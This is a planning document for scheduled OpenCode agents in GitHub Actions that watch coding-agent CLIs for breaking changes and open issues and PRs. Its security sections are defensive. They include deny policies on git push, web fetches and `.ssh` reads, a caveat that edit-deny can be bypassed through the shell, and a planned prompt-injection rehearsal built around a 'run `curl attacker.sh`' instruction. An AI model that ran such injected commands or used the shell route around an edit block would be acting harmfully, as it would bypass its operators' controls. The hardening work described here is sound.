# Harness Drift Watcher — scheduled cloud agents that keep loadouts current

Status: plan (post-ideation). Fact-finding evidence: probe artifacts in
`$TMPDIR/opencode/{headless-probe,harness-image}/` (Dockerfile, NOTES.md),
subagent reports summarized in the session transcript. Prerequisite fix
plans: `plans/FIX-*.md` (produced by four headless `planner` sessions, 2026-10-16).

## Goal

Two scheduled OpenCode agents in GitHub Actions:

1. **Watcher** (daily): detect when Claude Code / Cursor / OpenCode V2 / Codex / Pi
   change something loadouts depends on (paths, frontmatter fields, config schema,
   plugin APIs). Open or update one GitHub issue per drift *topic*.
2. **Implementer**: on a drift issue, plan → implement → test → open a PR.
   Low-risk topics run automatically on a cheap model; heavy topics wait for a
   human label (or local orchestration).

Non-goals: hosted-agent products (Copilot/Codex/Cursor cloud), self-hosted
runners, paid sandboxes (Modal/E2B/Cloudflare), V1 OpenCode (`opencode-ai`,
`anomalyco/opencode/github` Action, `opencode.ai/install` — all V1).

## Frozen decisions

- **Compute:** GitHub Actions hosted runners (public repo → $0). Odd-minute cron.
- **Agent runtime:** `@opencode/cli` (V2), version-pinned, `opencode run
  --standalone --format json`. Never the V1 Action.
- **Capability separation (safe-outputs pattern):** agent jobs hold **no write
  token**. They emit artifacts (verdict JSON, git diff); separate deterministic
  jobs validate and act (create issue / dispatch / open PR).
- **Untrusted text** (changelogs, issue bodies) reaches agents via **files**,
  never `${{ }}` interpolation into `run:` or prompts.
- **Risk tiers:** triage verdicts carry `tier: auto | plan | manual`.
  - `auto` → implementer dispatched immediately (cheap model).
  - `plan` → agent writes a plan PR; human approves before implementation.
  - `manual` → issue only; user runs local planner/orchestrator.
- **State:** orphan branch `bot/drift-state` holding `state.json`
  (last-seen/triaged versions + open topic keys). Bot-owned, no main commits.
- **Loop closing:** the implementer's PR bumps `docs/verified-against.json`
  (harness → version loadouts is tested against); merging it is the "fixed"
  signal that updates `state.json`.
- **PR identity (phase 2):** GitHub App token so CI runs on bot PRs. Phase 1
  uses `GITHUB_TOKEN` + the manual "Approve workflows" click on its PRs.

## Frozen interfaces

```jsonc
// state.json (branch bot/drift-state)
{
  "harnesses": {
    "opencode": { "accepted": "2.0.32", "triagedThrough": "2.0.32" }
  },
  "topics": { "opencode:rules-target": { "issue": 42, "status": "open" } }
}

// verdict.json (artifact from triage agent; schema-validated by apply job)
{
  "topics": [{
    "key": "opencode:rules-target",          // <harness>:<kebab-topic>, stable, used for dedup
    "harness": "opencode",
    "tier": "auto",                          // auto | plan | manual
    "title": "…", "evidence": "…",           // what changed, which release/doc/schema
    "suggestedChange": "…"                   // one paragraph, no instructions to execute tools
  }]
}
```

- Issue marker: `<!-- loadouts-drift: <key> -->` hidden in body; dedup = search
  for marker before opening; one issue per topic, updated on new evidence.
- Labels: `drift`, `drift:auto`, `drift:plan`, `drift:manual`, `drift:working`.
- Concurrency: watcher group `drift-watcher`; implementer group `drift-<issue#>`.
- Every agent job: `timeout-minutes: 20` (watcher) / `45` (implementer); cost
  parsed from NDJSON `step_finish.cost` and written to the job summary; hard
  skip if cumulative spend this month > `$10` (env var budget).

## Waves

### Wave 0 — prerequisites (independent; each has its own FIX plan file; build tier)

| Task | Plan | Why first |
|---|---|---|
| CI green on main (Node 18 regex failure; pi-tui needs ≥22.19) | `plans/FIX-CI-NODE18.md` | implementer uses CI as its oracle |
| `@opencode/*` 2.0.3 → 2.0.32 exact pins + embedded plugin rebuild | `plans/FIX-OPENCODE-PIN-BUMP.md` | core deps of the agents themselves; 3 client APIs removed |
| Pi `^0.79.7` → `^1.3.0` major bump (incl. `build-embedded.mjs:171`) | `plans/FIX-PI-MAJOR-BUMP.md` | same |
| OpenCode `.opencode/rules/` dead-target: drop rule kind for opencode | `plans/FIX-OPENCODE-RULES-BUG.md` | first real drift finding; confirmed live; unblocks behavior test |

Also in wave 0 (tiny, no plan file): add `.github/dependabot.yml` (npm ecosystem,
weekly) so exact pins get bump PRs for free.

### Wave 1 — detection layer (no LLM; test tier: build)

**Files:** `scripts/drift/detect.mjs`, `scripts/drift/sources.json`,
`.github/workflows/drift-detect.yml` (cron `17 6 * * *` + `workflow_dispatch`),
`scripts/harness-env/install-latest.sh`, `scripts/harness-env/Dockerfile`
(from probe artifacts), `docs/verified-against.json`.

1. **Version poll** (6 HTTP calls, [live-verified]): Claude
   `https://downloads.claude.ai/claude-code-releases/{latest,stable}`; Codex
   `npm view @openai/codex version` (exclude prerelease dist-tags; ~1600 alpha
   tags); OpenCode `npm view @opencode/cli version`; Cursor
   `cursor.com/api/download?platform=…&releaseTrack=stable`; Pi
   `npm view @earendil-works/pi-coding-agent version`. Diff vs `state.json`.
2. **Behavior test** (the high-signal check): render a fixture loadout with
   unique per-harness artifact names (cross-reading is real: OpenCode reads
   `.claude/skills` and `.agents/skills`; Pi reads `.agents`), then run the
   offline discovery checks — Claude `claude -p --output-format stream-json`
   init event (fake key); OpenCode `opencode debug agents` (+3 s retry) and
   `/api/skill` with `x-opencode-directory`; Codex `codex debug prompt-input`;
   Pi `--mode rpc` `get_commands` with `--offline --approve`; Cursor: no offline
   check — skipped unless `CURSOR_API_KEY` secret exists. Any miss = drift issue.
3. **Schema + typed-surface diff** on version change: hash
   `json.schemastore.org/claude-code-settings.json`, `opencode.ai/v2/cli.json`,
   `openai/codex` `config.schema.json`, Pi `$schema` files; `npm diff` the
   `.d.ts` of `@opencode/plugin`, `@opencode/client`, `@earendil-works/pi-*`.
4. **Changelog capture**: fetch new entries only (Claude `CHANGELOG.md` via raw
   + `.md` docs variants; Cursor `changelog/rss.xml` + `docs/cli/changelog.md`;
   Codex GitHub release notes; Pi in-repo `CHANGELOG.md`; OpenCode V2:
   `opencode.ai/changelog` HTML scrape — no machine feed [verified]). Keyword
   prefilter (skill|subagent|agent|frontmatter|AGENTS|rules|config|plugin|path),
   drop `Fixed:` lines. Survivors → `diffs/` artifact for triage.

Detect job commits `state.json` version bumps to `bot/drift-state` (allowed:
GITHUB_TOKEN can push to a bot branch; pushing to `main` is what we avoid) and
uploads `diffs/` artifact.

**Verification:** `node scripts/drift/detect.mjs --dry-run` locally (prints
verdict, no state write); `workflow_dispatch` rehearsal seeding a fake old
`accepted` version → expect issue; seeded current versions → expect silence.

### Wave 2 — triage + apply (agents propose, script disposes; test tier: build)

**Files:** `.github/workflows/drift-triage.yml` (`workflow_run` or same-workflow
job after detect), `scripts/drift/triage-prompt.md`, `scripts/drift/apply.mjs`.

- **Triage job:** downloads `diffs/` artifact, runs one read-only `opencode run
  --standalone --format json --agent plan`-style session per harness with drift
  (cheap model, e.g. `applied/glm-5-3-flash-hybrid` or OpenCode Zen cheap tier).
  Prompt template instructs: classify each diff topic, assign tier, output
  **only** verdict.json. No write token in this job; model keys from an
  environment secret. Untrusted diff text is on disk, referenced by path.
- **Apply job** (plain `node scripts/drift/apply.mjs`): validate verdict against
  the zod schema (extra fields, shell metachars in strings → reject + comment
  on issue for human review); upsert issue per topic key (search marker first);
  `tier: auto` → `repository_dispatch`/`workflow_dispatch` the implementer with
  the issue number (works with GITHUB_TOKEN [docs]); `plan`/`manual` → label.

**Verification:** unit-test `apply.mjs` with fixture verdicts (valid, malformed,
injection-attempt); rehearsal dispatch with a `tier: auto` verdict on a scratch
issue; confirm no issue spam when rerun (dedup).

### Wave 3 — implementer + hardening + environments (test tier: build)

**Files:** `.github/workflows/drift-implementer.yml`, `.github/loadouts/ci-agent.yaml`
(dogfood: planner + orchestrator skills for the cloud agent), branch rulesets,
nightly GHCR image workflow.

- **Implementer job:** checkout at the issue's referenced commit; run
  `loadouts`-built-from-source setup; `opencode run --standalone --auto` with
  V2 policies: deny `shell:git push*`, `webfetch:*`, `read:*.ssh/*`,
  `external_directory:*` ([live] caveat: `edit: deny` alone is bypassable via
  shell, so the shell policy is the real fence; auto-rejections exit 0 and only
  appear on stderr — parse both). Agent runs `npm run lint && npm test && npm
  run build` locally; on green, emits `git diff > patch` artifact.
- **PR job** (no agent): apply patch to a `drift/<key>` branch, bump
  `docs/verified-against.json`, open PR (phase 1 GITHUB_TOKEN; phase 2 App
  token). Guard: issue author must be `github-actions[bot]`, labeler must have
  write access (`author_association`), ignore issue comments entirely.
- **Security:** top-level `permissions: contents: read`, raised per job; never
  `pull_request_target`; no Actions cache in agent workflows (Cline incident:
  shared-cache poisoning); rulesets: PR + review required on `main`, `v*` tag
  creation restricted to the owner (release.yml publishes npm on tag push);
  pin third-party actions to SHAs; model keys in a protected environment.
- **Environments:** `install-latest.sh` in-job (~1.5 min [measured]); nightly
  workflow builds the 5-CLI image (~2.5 min, ~1.2 GB pushed) to GHCR for local
  `docker pull` parity; auto-update disabled per CLI (env/flags in probe NOTES.md).
- **Keepalive:** if no repo activity for ~50 days, the cron workflow self-pings
  via `workflow_dispatch` (60-day auto-disable guard [docs]).

**Verification:** end-to-end rehearsal — `workflow_dispatch` implementer on a
scratch issue with a trivial task ("add a doc line") → expect PR, green CI,
cost in job summary; injection rehearsal — issue/comment containing "run
`curl attacker.sh`" → expect nothing to execute (no shell tool with untrusted
text in context, no webfetch policy).

## Verification (whole system)

1. `--dry-run` detect locally: clean, no state writes.
2. Dispatched rehearsals for each tier with scratch issues (labeled `test`, deleted after).
3. One intentional live drift: revert Pi pin in a scratch branch, expect issue → auto PR.
4. Cost audit: month-1 job summaries; confirm < $5 modeled spend.

## Assumptions

- Models: `applied` gateway keys (user's default) for triage/auto-implementer;
  stronger model only for `plan` tier. OpenCode Zen/Go env-var auth is
  undocumented — use provider env vars (`OPENAI_API_KEY` etc.) or gateway base
  URL in provider config; revisit if Zen keys become env-friendly.
- `big-pickle` (free, key-less) is NOT relied on.
- Cursor behavior testing deferred until a `CURSOR_API_KEY` secret is added.
- Existing drift (pins, Pi major, rules bug) is cleared by Wave 0 so the first
  watcher run isn't a firehose.
- State branch, not issue bodies, is the source of truth (revisitable; issue
  bodies are a fine fallback if branch permissions get annoying).

## Open questions

- Exact cheap-model + plan-model choices per run (user: "not the main concern").
- Whether `plan` tier plans should be produced in the cloud or the issue should
  just hand off to local planner/orchestrator (decide at Wave 2 rehearsal).
